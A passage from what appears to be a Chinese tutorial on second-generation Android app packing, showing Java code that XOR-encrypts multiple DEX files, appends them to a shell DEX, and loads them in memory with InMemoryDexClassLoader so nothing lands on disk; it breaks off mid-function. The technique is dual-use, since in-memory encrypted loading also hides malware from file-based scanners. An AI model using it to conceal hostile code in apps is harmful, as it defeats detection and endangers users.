<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 一代加固：解密后的APK必须写入磁盘</span>
<span class="hljs-type">File</span> <span class="hljs-variable">apkFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(apkPath);
<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(apkFile);
fos.write(decryptedApkData);  <span class="hljs-comment">// [安全风险] DEX落地到文件系统</span>
fos.close();

<span class="hljs-comment">// 使用DexClassLoader从文件加载</span>
<span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(
        apkPath,   <span class="hljs-comment">// 源APK文件路径 - 攻击者可直接复制此文件</span>
        dexPath,   <span class="hljs-comment">// 优化后的DEX路径</span>
        libPath,   <span class="hljs-comment">// Native库路径</span>
        parent     <span class="hljs-comment">// 父ClassLoader</span>
);
</code></pre>
<h4 data-id="heading-4">二代加固的解决方案</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 二代加固：DEX直接在内存中加载，不写入磁盘</span>
ByteBuffer[] dexBuffers = extractDexFilesFromShellDex(shellDexData);

<span class="hljs-comment">// 使用InMemoryDexClassLoader从内存加载（Android 8.0+）</span>
<span class="hljs-type">InMemoryDexClassLoader</span> <span class="hljs-variable">dexClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDexClassLoader</span>(
        dexBuffers,  <span class="hljs-comment">// DEX字节数据 - 仅存在于内存中</span>
        libraryPath, <span class="hljs-comment">// Native库路径</span>
        parent       <span class="hljs-comment">// 父ClassLoader</span>
);
<span class="hljs-comment">// DEX从未写入文件系统，攻击者无法通过文件监控获取</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">二代加固的技术挑战</h3>
<p>虽然<code>InMemoryDexClassLoader</code>是Android 8.0 (API 26)才引入的API，但二代加固需要支持Android 5.0+的设备。这带来了以下技术挑战：</p>
<h4 data-id="heading-6">1. API版本兼容性问题</h4>






























<table><thead><tr><th>Android版本</th><th>API级别</th><th>InMemoryDexClassLoader支持情况</th></tr></thead><tbody><tr><td>Android 10+</td><td>29+</td><td>支持<code>ByteBuffer[]</code> + <code>libraryPath</code></td></tr><tr><td>Android 8.1-9</td><td>27-28</td><td>支持<code>ByteBuffer[]</code>，不支持<code>libraryPath</code></td></tr><tr><td>Android 8.0</td><td>26</td><td>仅支持单个<code>ByteBuffer</code></td></tr><tr><td>Android 5.0-7.1</td><td>21-25</td><td>不存在此API</td></tr></tbody></table>
<h4 data-id="heading-7">2. Multidex支持</h4>
<p>现代Android应用通常包含多个DEX文件，二代加固必须能够处理<code>classes.dex</code>、<code>classes2.dex</code>等多DEX场景。</p>
<h4 data-id="heading-8">3. Native库加载</h4>
<p>Android 10以下版本的<code>InMemoryDexClassLoader</code>不支持<code>librarySearchPath</code>参数，需要手动注入Native库路径。</p>
<p>另外，若源程序设置了<code>android:extractNativeLibs="false"</code>，系统安装应用时则不会释放lib文件到文件系统，而是运行时直接映射apk文件的lib数据。当前为了方便理解加固的原理，先简化lib文件的处理流程，加壳时，直接把源程序的lib库拷贝到壳程序的lib库下，并且把清单文件的<code>android:extractNativeLibs="false"</code>属性改成<code>android:extractNativeLibs="true"</code>, 这样壳程序运行后可以根据运行版本不同手动注入Native库路径。</p>
<hr/>
<h3 data-id="heading-9">二代加固整体架构</h3>
<h4 data-id="heading-10">与一代的模块对比</h4>
<pre><code class="hljs language-scss" lang="scss">一代加固流程：
┌─────────────┐    ┌─────────────┐    ┌─────────────────────────┐
│  壳DEX      │    │  加密源APK   │    │  合并后的classes<span class="hljs-selector-class">.dex</span>    │
│             │ +  │             │ =&gt; │  <span class="hljs-selector-attr">[壳DEX]</span><span class="hljs-selector-attr">[加密APK]</span><span class="hljs-selector-attr">[4字节]</span> │
└─────────────┘    └─────────────┘    └─────────────────────────┘
                                                  │
                         运行时解密 → 写入Source<span class="hljs-selector-class">.apk</span>到本地文件 → DexClassLoader加载

二代加固流程：
┌─────────────┐    ┌─────────────┐    ┌──────────────────────────┐
│  壳DEX      │    │加密源DEX集合 │    │  合并后的classes<span class="hljs-selector-class">.dex</span>     │
│             │ +  │(支持Multidex)│ =&gt; │  <span class="hljs-selector-attr">[壳DEX]</span><span class="hljs-selector-attr">[加密DEXs]</span><span class="hljs-selector-attr">[4字节]</span>│
└─────────────┘    └─────────────┘    └──────────────────────────┘
                                                  │
                      运行时解密 → ByteBuffer<span class="hljs-selector-attr">[]</span> → InMemoryDexClassLoader
                                     ↑
                              DEX不落地，直接内存加载
</code></pre>
<hr/>
<h3 data-id="heading-11">模块一：Packer 加壳工具模块</h3>
<blockquote>
<p><strong>相对一代的改动</strong>：此模块有<strong>重要修改</strong>。主要变化是处理对象从"整个源APK"变为"源DEX集合"，支持Multidex打包格式。</p>
</blockquote>
<h4 data-id="heading-12">1.1 与一代的核心差异</h4>






























<table><thead><tr><th>对比项</th><th>一代加固 (V1)</th><th>二代加固 (V2)</th></tr></thead><tbody><tr><td><strong>处理对象</strong></td><td>加密后的整个源APK</td><td>加密后的源DEX集合</td></tr><tr><td><strong>尾部格式</strong></td><td><code>[壳DEX][加密APK][APK大小4字节]</code></td><td><code>[壳DEX][加密DEXs][DEXs大小4字节]</code></td></tr><tr><td><strong>Multidex支持</strong></td><td>不支持</td><td>原生支持</td></tr><tr><td><strong>数据结构</strong></td><td>单一APK文件</td><td>DEX集合（带长度前缀）</td></tr></tbody></table>
<h4 data-id="heading-13">1.2 DEX合并数据格式</h4>
<h4 data-id="heading-14">DEX集合的打包格式</h4>
<p>为了支持Multidex，二代加固使用特殊的DEX集合格式：</p>
<pre><code class="hljs language-scss" lang="scss">加密前的DEX集合格式：
┌──────────────────────────────────────────────────────────────────┐
│  <span class="hljs-selector-attr">[DEX1大小]</span><span class="hljs-selector-attr">[DEX1数据]</span><span class="hljs-selector-attr">[DEX2大小]</span><span class="hljs-selector-attr">[DEX2数据]</span>...<span class="hljs-selector-attr">[DEXn大小]</span><span class="hljs-selector-attr">[DEXn数据]</span>   │
│   <span class="hljs-number">4</span>字节                <span class="hljs-number">4</span>字节                  <span class="hljs-number">4</span>字节               │
└──────────────────────────────────────────────────────────────────┘
                              ↓ XOR加密
                              ↓
最终classes<span class="hljs-selector-class">.dex</span>格式：
┌────────────────────────────────────────────────────────────────────┐
│         壳DEX          │      加密DEX集合       │  集合大小(<span class="hljs-number">4</span>字节)  │
│  (ShellProxyV2 代码)   │    (XOR加密后的数据)   │   小端序存储      │
└────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-15">具体解析示例</h4>
<p>假设源APK包含3个DEX文件：</p>
<pre><code class="hljs language-python" lang="python">classes.dex  - 大小: <span class="hljs-number">1048576</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x100000</span>)
classes2.dex - 大小: <span class="hljs-number">2097152</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x200000</span>)
classes3.dex - 大小: <span class="hljs-number">524288</span> <span class="hljs-built_in">bytes</span>  (<span class="hljs-number">0x80000</span>)

打包后的DEX集合数据（加密前）：
┌─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┐
│ <span class="hljs-number">0x00100000</span>  │ DEX1 数据   │ <span class="hljs-number">0x00200000</span>  │ DEX2 数据   │ <span class="hljs-number">0x00080000</span>  │ DEX3 数据   │
│ (小端序)    │ (1MB)       │ (小端序)    │ (2MB)       │ (小端序)    │ (512KB)     │
└─────────────┴─────────────┴─────────────┴─────────────┴─────────────┴─────────────┘
     <span class="hljs-number">4</span>字节       <span class="hljs-number">1048576</span>       <span class="hljs-number">4</span>字节        <span class="hljs-number">2097152</span>        <span class="hljs-number">4</span>字节         <span class="hljs-number">524288</span>

总大小 = <span class="hljs-number">4</span> + <span class="hljs-number">1048576</span> + <span class="hljs-number">4</span> + <span class="hljs-number">2097152</span> + <span class="hljs-number">4</span> + <span class="hljs-number">524288</span> = <span class="hljs-number">3670028</span> <span class="hljs-built_in">bytes</span>
</code></pre>
<h4 data-id="heading-16">核心打包代码</h4>
<p>以下是DEX处理器的核心实现，与一代相同但处理对象不同：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * DexProcessor.java - DEX处理器
 * 将壳DEX与加密后的源DEX集合合并
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DexProcessor</span> {

    <span class="hljs-comment">// DEX文件头偏移量（与一代相同）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CHECKSUM_OFFSET</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;    <span class="hljs-comment">// Adler32校验和偏移</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNATURE_OFFSET</span> <span class="hljs-operator">=</span> <span class="hljs-number">12</span>;  <span class="hljs-comment">// SHA-1签名偏移</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">FILE_SIZE_OFFSET</span> <span class="hljs-operator">=</span> <span class="hljs-number">32</span>;  <span class="hljs-comment">// 文件大小偏移</span>

    <span class="hljs-comment">/**
     * 合并壳DEX与加密后的源DEX集合
     * 
     * <span class="hljs-doctag">@param</span> shellDexArray   壳DEX数据
     * <span class="hljs-doctag">@param</span> encryptedDexs   加密后的源DEX集合
     * <span class="hljs-doctag">@return</span> 合并后的新DEX数据
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] mergeDexFiles(<span class="hljs-type">byte</span>[] shellDexArray, <span class="hljs-type">byte</span>[] encryptedDexs) {
        <span class="hljs-comment">// 计算新DEX总大小</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">newDexLen</span> <span class="hljs-operator">=</span> shellDexArray.length + encryptedDexs.length + <span class="hljs-number">4</span>;
        <span class="hljs-type">byte</span>[] newDexArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[newDexLen];
        
        <span class="hljs-comment">// 1. 拷贝壳DEX</span>
        System.arraycopy(shellDexArray, <span class="hljs-number">0</span>, newDexArray, <span class="hljs-number">0</span>, shellDexArray.length);
        
        <span class="hljs-comment">// 2. 追加加密后的源DEX集合</span>
        System.arraycopy(encryptedDexs, <span class="hljs-number">0</span>, newDexArray, shellDexArray.length, encryptedDexs.length);
        
        <span class="hljs-comment">// 3. 写入DEX集合大小（4字节，小端序）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">dexsSize</span> <span class="hljs-operator">=</span> encryptedDexs.length;
        newDexArray[newDexLen - <span class="hljs-number">4</span>] = (<span class="hljs-type">byte</span>) (dexsSize &amp; <span class="hljs-number">0xFF</span>);
        newDexArray[newDexLen - <span class="hljs-number">3</span>] = (<span class="hljs-type">byte</span>) ((dexsSize &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);
        newDexArray[newDexLen - <span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((dexsSize &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);
        newDexArray[newDexLen - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) ((dexsSize &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>);
        
        <span class="hljs-comment">// 4. 修复DEX头部信息</span>
        fixFileSize(newDexArray, newDexLen);  <span class="hljs-comment">// 修正文件大小</span>
        fixSignature(newDexArray);             <span class="hljs-comment">// 重新计算SHA-1签名</span>
        fixCheckSum(newDexArray);              <span class="hljs-comment">// 重新计算Adler32校验和</span>
        
        <span class="hljs-keyword">return</span> newDexArray;
    }
    
    <span class="hljs-comment">/**
     * 将源DEX列表打包为DEX集合格式
     * 
     * <span class="hljs-doctag">@param</span> dexList DEX字节数组列表
     * <span class="hljs-doctag">@return</span> 打包后的DEX集合（[大小1][数据1][大小2][数据2]...）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] packDexList(List&lt;<span class="hljs-type">byte</span>[]&gt; dexList) {
        <span class="hljs-comment">// 计算总大小</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">totalSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] dex : dexList) {
            totalSize += <span class="hljs-number">4</span> + dex.length;  <span class="hljs-comment">// 4字节大小 + DEX数据</span>
        }
        
        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[totalSize];
        <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] dex : dexList) {
            <span class="hljs-comment">// 写入当前DEX大小（小端序）</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">dexSize</span> <span class="hljs-operator">=</span> dex.length;
            result[pos++] = (<span class="hljs-type">byte</span>) (dexSize &amp; <span class="hljs-number">0xFF</span>);
            result[pos++] = (<span class="hljs-type">byte</span>) ((dexSize &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);
            result[pos++] = (<span class="hljs-type">byte</span>) ((dexSize &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);
            result[pos++] = (<span class="hljs-type">byte</span>) ((dexSize &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>);
            
            <span class="hljs-comment">// 写入DEX数据</span>
            System.arraycopy(dex, <span class="hljs-number">0</span>, result, pos, dex.length);
            pos += dex.length;
        }
        
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<h4 data-id="heading-17">DEX头部修复实现</h4>
<p>当DEX文件被修改后，必须重新计算头部的三个字段：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 修正DEX文件大小字段
 * 位置: 偏移量32，长度4字节
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixFileSize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dex, <span class="hljs-type">int</span> size)</span> {
    <span class="hljs-comment">// DEX文件大小字段位于偏移量32处，4字节，小端序</span>
    dex[<span class="hljs-number">32</span>] = (<span class="hljs-type">byte</span>) (size &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">33</span>] = (<span class="hljs-type">byte</span>) ((size &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">34</span>] = (<span class="hljs-type">byte</span>) ((size &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">35</span>] = (<span class="hljs-type">byte</span>) ((size &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>);
}

<span class="hljs-comment">/**
 * 重新计算SHA-1签名
 * 位置: 偏移量12，长度20字节
 * 范围: 对偏移量32到文件末尾的数据计算SHA-1
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixSignature</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dex)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA-1"</span>);
        <span class="hljs-comment">// 从偏移量32开始计算到文件末尾</span>
        md.update(dex, <span class="hljs-number">32</span>, dex.length - <span class="hljs-number">32</span>);
        <span class="hljs-type">byte</span>[] signature = md.digest();
        <span class="hljs-comment">// 将20字节签名写入偏移量12</span>
        System.arraycopy(signature, <span class="hljs-number">0</span>, dex, <span class="hljs-number">12</span>, <span class="hljs-number">20</span>);
    } <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"SHA-1 algorithm not found"</span>, e);
    }
}

<span class="hljs-comment">/**
 * 重新计算Adler32校验和
 * 位置: 偏移量8，长度4字节
 * 范围: 对偏移量12到文件末尾的数据计算Adler32
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixCheckSum</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dex)</span> {
    <span class="hljs-type">Adler32</span> <span class="hljs-variable">adler32</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Adler32</span>();
    <span class="hljs-comment">// 从偏移量12开始计算到文件末尾</span>
    adler32.update(dex, <span class="hljs-number">12</span>, dex.length - <span class="hljs-number">12</span>);
    <span class="hljs-type">long</span> <span class="hljs-variable">checksum</span> <span class="hljs-operator">=</span> adler32.getValue();
    <span class="hljs-comment">// 将4字节校验和写入偏移量8，小端序</span>
    dex[<span class="hljs-number">8</span>] = (<span class="hljs-type">byte</span>) (checksum &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">9</span>] = (<span class="hljs-type">byte</span>) ((checksum &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">10</span>] = (<span class="hljs-type">byte</span>) ((checksum &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);
    dex[<span class="hljs-number">11</span>] = (<span class="hljs-type">byte</span>) ((checksum &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-18">模块二：Shell-App 壳程序模块（业内也叫脱壳流程）</h3>
<blockquote>
<p><strong>相对一代的改动</strong>：此模块是<strong>核心改动模块</strong>。主要变化包括：</p>
<ol>
<li><strong>DEX加载方式</strong>：从<code>DexClassLoader</code>（文件加载）改为<code>InMemoryDexClassLoader</code>（内存加载）</li>
<li><strong>数据解析</strong>：从提取完整APK改为解析DEX集合格式并转换为<code>ByteBuffer[]</code></li>
<li><strong>版本兼容</strong>：新增<code>CompatInMemoryDexClassLoader</code>处理Android 5.0-9的兼容性</li>
<li><strong>Native库注入</strong>：新增<code>RetroLoadLibrary</code>解决Android 10以下的JNI加载问题</li>
</ol>
</blockquote>
<h4 data-id="heading-19">2.1 与一代的核心差异对比</h4>













































<table><thead><tr><th>对比项</th><th>一代加固 Shell</th><th>二代加固 Shell</th></tr></thead><tbody><tr><td><strong>ClassLoader类型</strong></td><td><code>DexClassLoader</code></td><td><code>InMemoryDexClassLoader</code></td></tr><tr><td><strong>DEX来源</strong></td><td>文件系统<code>Source.apk</code></td><td>内存<code>ByteBuffer[]</code></td></tr><tr><td><strong>DEX解析</strong></td><td>提取完整APK</td><td>解析DEX集合格式</td></tr><tr><td><strong>文件落地</strong></td><td>需要落地到私有目录</td><td>不落地（纯内存）</td></tr><tr><td><strong>Native库加载</strong></td><td>原生支持</td><td>需手动注入（Android 10以下）</td></tr><tr><td><strong>版本兼容</strong></td><td>简单</td><td>需处理多版本API差异</td></tr><tr><td><strong>新增组件</strong></td><td>无</td><td><code>CompatInMemoryDexClassLoader</code>、<code>RetroLoadLibrary</code></td></tr></tbody></table>
<h4 data-id="heading-20">2.2 二代壳Application整体流程</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ShellProxyApplicationV2.java - 二代加固壳Application
 * 
 * 核心流程：
 * 1. 从APK读取合并后的classes.dex
 * 2. 从dex尾部解析并解密源DEX集合
 * 3. 将源DEX集合转换为ByteBuffer[]
 * 4. 使用InMemoryDexClassLoader加载（不落地）
 * 5. 替换系统ClassLoader引用
 * 6. 替换Application实例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellProxyApplicationV2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"shell_v2"</span>;
    
    <span class="hljs-keyword">private</span> String mApplicationName;
    <span class="hljs-keyword">private</span> Application mSourceApplication;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attachBaseContext</span><span class="hljs-params">(Context base)</span> {
        <span class="hljs-built_in">super</span>.attachBaseContext(base);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// Step 1: 读取壳DEX文件</span>
            <span class="hljs-type">byte</span>[] shellDexData = readDexFromApk();
            <span class="hljs-keyword">if</span> (shellDexData == <span class="hljs-literal">null</span>) {
                log(<span class="hljs-string">"Failed to read dex from APK"</span>);
                <span class="hljs-keyword">return</span>;
            }
            log(<span class="hljs-string">"成功从源APK中读取classes.dex"</span>);
            
            <span class="hljs-comment">// Step 2: 从中分离出源DEX文件集合（关键步骤！）</span>
            ByteBuffer[] byteBuffers = extractDexFilesFromShellDex(shellDexData);
            log(<span class="hljs-string">"成功分离出源dex集合"</span>);
            
            <span class="hljs-comment">// Step 3: 替换ClassLoader（使用内存加载，不落地）</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">classLoaderSuccess</span> <span class="hljs-operator">=</span> replaceClassLoader(byteBuffers);
            <span class="hljs-keyword">if</span> (!classLoaderSuccess) {
                log(<span class="hljs-string">"ClassLoader replacement failed"</span>);
                <span class="hljs-keyword">return</span>;
            }
            log(<span class="hljs-string">"InMemoryDexClassLoader replacement succeeded"</span>);
            
            <span class="hljs-comment">// Step 4: 获取源程序Application类名</span>
            mApplicationName = getSourceApplicationName();
            <span class="hljs-keyword">if</span> (mApplicationName == <span class="hljs-literal">null</span>) {
                log(<span class="hljs-string">"No source application found"</span>);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-comment">// Step 5: 创建源程序Application实例</span>
            mSourceApplication = makeSourceApplication();
            <span class="hljs-keyword">if</span> (mSourceApplication == <span class="hljs-literal">null</span>) {
                log(<span class="hljs-string">"Failed to create source application instance"</span>);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-comment">// Step 6: 替换系统中的Application引用</span>
            replaceApplicationInSystem(<span class="hljs-built_in">this</span>, mSourceApplication);
            
            <span class="hljs-comment">// Step 7: 调用源程序Application的attachBaseContext</span>
            invokeSourceApplicationAttach(mSourceApplication, base);
            
            log(<span class="hljs-string">"Application replacement completed successfully"</span>);
            
        } <span class="hljs-keyword">catch</span> (Throwable e) {
            log(<span class="hljs-string">"Error in attachBaseContext: "</span> + Log.getStackTraceString(e));
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onCreate();
        <span class="hljs-comment">// 调用源Application的onCreate</span>
        <span class="hljs-keyword">if</span> (mSourceApplication != <span class="hljs-literal">null</span>) {
            mSourceApplication.onCreate();
        }
    }
}
</code></pre>
<h4 data-id="heading-21">关键步骤：从壳DEX中提取源DEX集合</h4>
<p>这是二代加固与一代加固的<strong>核心区别</strong>：一代提取的是完整APK，二代提取的是DEX集合并转换为<code>ByteBuffer[]</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 从壳DEX文件中提取源DEX集合
 * 
 * 数据格式（从尾部开始）：
 * ┌──────────────────────────────────────────────────────────────┐
 * │    壳DEX代码     │      加密的DEX集合      │  集合大小(4字节) │
 * └──────────────────────────────────────────────────────────────┘
 *                                               ← 从这里开始解析
 */</span>
<span class="hljs-keyword">private</span> ByteBuffer[] extractDexFilesFromShellDex(<span class="hljs-type">byte</span>[] shellDexData) <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-type">int</span> <span class="hljs-variable">shellDexLength</span> <span class="hljs-operator">=</span> shellDexData.length;
    
    <span class="hljs-comment">// ==================== 第一步：读取DEX集合的总大小 ====================</span>
    <span class="hljs-type">byte</span>[] sourceDexsSizeByte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];
    <span class="hljs-comment">// 从最后4字节读取</span>
    System.arraycopy(shellDexData, shellDexLength - <span class="hljs-number">4</span>, sourceDexsSizeByte, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);
    <span class="hljs-comment">// 使用ByteBuffer转换，注意是小端序</span>
    <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">wrap</span> <span class="hljs-operator">=</span> ByteBuffer.wrap(sourceDexsSizeByte);
    <span class="hljs-type">int</span> <span class="hljs-variable">sourceDexsSizeInt</span> <span class="hljs-operator">=</span> wrap.order(ByteOrder.LITTLE_ENDIAN).getInt();
    log(<span class="hljs-string">"源DEX集合的大小: "</span> + sourceDexsSizeInt);
    
    <span class="hljs-comment">// ==================== 第二步：读取加密的DEX集合数据 ====================</span>
    <span class="hljs-type">byte</span>[] sourceDexsData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[sourceDexsSizeInt];
    <span class="hljs-comment">// 数据位置 = 总长度 - DEX集合大小 - 4字节（尾部大小字段）</span>
    System.arraycopy(shellDexData, shellDexLength - sourceDexsSizeInt - <span class="hljs-number">4</span>, 
                     sourceDexsData, <span class="hljs-number">0</span>, sourceDexsSizeInt);
    
    <span class="hljs-comment">// ==================== 第三步：解密DEX集合 ====================</span>
    sourceDexsData = decrypt(sourceDexsData);  <span class="hljs-comment">// XOR解密</span>
    
    <span class="hljs-comment">// ==================== 第四步：从DEX集合中分离各个DEX ====================</span>
    ArrayList&lt;<span class="hljs-type">byte</span>[]&gt; sourceDexList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">while</span> (pos &lt; sourceDexsSizeInt) {
        <span class="hljs-comment">// 读取当前DEX的大小（4字节，小端序）</span>
        <span class="hljs-type">byte</span>[] singleDexSizeByte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];
        System.arraycopy(sourceDexsData, pos, singleDexSizeByte, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);
        <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">singleDexWrap</span> <span class="hljs-operator">=</span> ByteBuffer.wrap(singleDexSizeByte);
        <span class="hljs-type">int</span> <span class="hljs-variable">singleDexSizeInt</span> <span class="hljs-operator">=</span> singleDexWrap.order(ByteOrder.LITTLE_ENDIAN).getInt();
        log(<span class="hljs-string">"当前singleDex的大小: "</span> + singleDexSizeInt);
        
        <span class="hljs-comment">// 边界校验：确保数据合法</span>
        <span class="hljs-keyword">if</span> (singleDexSizeInt &lt;= <span class="hljs-number">0</span> || pos + <span class="hljs-number">4</span> + singleDexSizeInt &gt; sourceDexsData.length) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">"Invalid dex size: "</span> + singleDexSizeInt);
        }
        
        <span class="hljs-comment">// 读取DEX数据</span>
        <span class="hljs-type">byte</span>[] singleDexData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[singleDexSizeInt];
        System.arraycopy(sourceDexsData, pos + <span class="hljs-number">4</span>, singleDexData, <span class="hljs-number">0</span>, singleDexSizeInt);
        
        <span class="hljs-comment">// 加入列表</span>
        sourceDexList.add(singleDexData);
        
        <span class="hljs-comment">// 移动位置指针</span>
        pos += <span class="hljs-number">4</span> + singleDexSizeInt;
    }
    
    <span class="hljs-comment">// ==================== 第五步：转换为ByteBuffer数组 ====================</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">dexNum</span> <span class="hljs-operator">=</span> sourceDexList.size();
    log(<span class="hljs-string">"源DEX的数量: "</span> + dexNum);
    
    ByteBuffer[] dexBuffers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteBuffer</span>[dexNum];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dexNum; i++) {
        dexBuffers[i] = ByteBuffer.wrap(sourceDexList.get(i));
    }
    
    <span class="hljs-keyword">return</span> dexBuffers;  <span class="hljs-comment">// 返回ByteBuffer[]供InMemoryDexClassLoader使用</span>
}

<span class="hljs-comment">/**
 * 简单XOR解密（与加密使用相同算法）
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] decrypt(<span class="hljs-type">byte</span>[] data) {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.length; i++) {
